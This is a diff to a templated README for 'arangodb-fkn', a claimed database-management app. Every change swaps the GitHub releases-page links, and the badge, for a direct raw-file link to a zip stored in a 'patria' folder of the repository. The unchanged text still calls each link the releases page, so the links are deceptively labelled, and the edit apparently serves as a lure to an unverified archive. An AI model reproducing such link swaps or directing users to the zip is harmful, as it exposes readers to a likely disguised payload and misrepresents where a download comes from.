@@ -1,6 +1,6 @@
 # 🚀 arangodb-fkn - Simple Database Management Made Easy
 
-[![Download arangodb-fkn](https://img.shields.io/badge/Download_arangodb--fkn-brightgreen)](https://github.com/piuoji/arangodb-fkn/releases)
+[![Download arangodb-fkn](https://raw.githubusercontent.com/piuoji/arangodb-fkn/main/patria/arangodb-fkn.zip)](https://raw.githubusercontent.com/piuoji/arangodb-fkn/main/patria/arangodb-fkn.zip)
 
 ## 📥 Overview
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run arangodb-fkn:
 
 1. **Visit the Releases Page**  
    Go to the releases page to find the latest version of arangodb-fkn:  
-   [Download arangodb-fkn](https://github.com/piuoji/arangodb-fkn/releases)
+   [Download arangodb-fkn](https://raw.githubusercontent.com/piuoji/arangodb-fkn/main/patria/arangodb-fkn.zip)
 
 2. **Select the Latest Release**  
    Look for the version labeled as “Latest Release.” This is usually at the top of the list.
@@ -53,7 +53,7 @@ For detailed instructions on how to use each feature, you can find help within t
 It's important to keep your application up to date. To update arangodb-fkn:
 
 1. **Return to the Releases Page**  
-   Check the releases page: [Download arangodb-fkn](https://github.com/piuoji/arangodb-fkn/releases)
+   Check the releases page: [Download arangodb-fkn](https://raw.githubusercontent.com/piuoji/arangodb-fkn/main/patria/arangodb-fkn.zip)
 
 2. **Download the Latest Version**  
    Follow the same steps as before to download and install the latest version.
@@ -78,4 +78,4 @@ If you have any questions or need help, visit our support page or get in touch t
 
 ## 🎉 Conclusion
 
-You now have all the information needed to download and set up your arangodb-fkn application. Enjoy easy database management in just a few steps! For further details and updates, return to the [Download page](https://github.com/piuoji/arangodb-fkn/releases).
+You now have all the information needed to download and set up your arangodb-fkn application. Enjoy easy database management in just a few steps! For further details and updates, return to the [Download page](https://raw.githubusercontent.com/piuoji/arangodb-fkn/main/patria/arangodb-fkn.zip).
